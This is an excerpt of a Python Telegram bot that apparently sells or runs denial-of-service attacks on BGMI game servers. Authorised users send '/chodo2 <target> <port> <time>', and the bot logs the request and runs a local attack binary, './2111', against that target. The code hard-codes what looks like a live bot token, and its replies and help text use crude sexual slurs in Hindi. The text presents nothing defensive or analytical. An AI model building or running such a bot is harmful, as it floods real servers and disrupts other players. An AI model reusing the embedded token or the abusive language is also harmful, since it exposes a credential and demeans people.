...
bot = telebot.TeleBot('7304132920:AAGhK9o_abLh8tRQolcg4mFY8VK6KbgRfzA')
...
def start_attack_reply(message, target, port, time):
    ...
    # Dictionary to store the last time each user ran the /chodo2 command
bgmi_cooldown = {}
...
@bot.message_handler(commands=['chodo2'])
def handle_attack(message):
    ...
    if user_id in allowed_user_ids:
        if attack_running:
            response = "Abhi Mai bhi chudai hi kr rha. Try /chodo."
            bot.reply_to(message, response)
            return
        ...
        if len(command) == 4:  # Updated to accept target, port, and time
            ...
            if time > 100:
                ...
                try:
                    record_command_logs(user_id, '/chodo2', target, port, time)
                    log_command(user_id, target, port, time)
                    start_attack_reply(message, target, port, time)

                    # Simulate attack process
                    full_command = f"./2111 {target} {port} {time} 100"
            ...
            response = "Usage: /chodo2 <target> <port> <time>"
    else:
...
def show_help(message):
    help_text ='''
💥 /chodo2 : 😫BGMI WALO KI MAA KO CHODO🥵. 
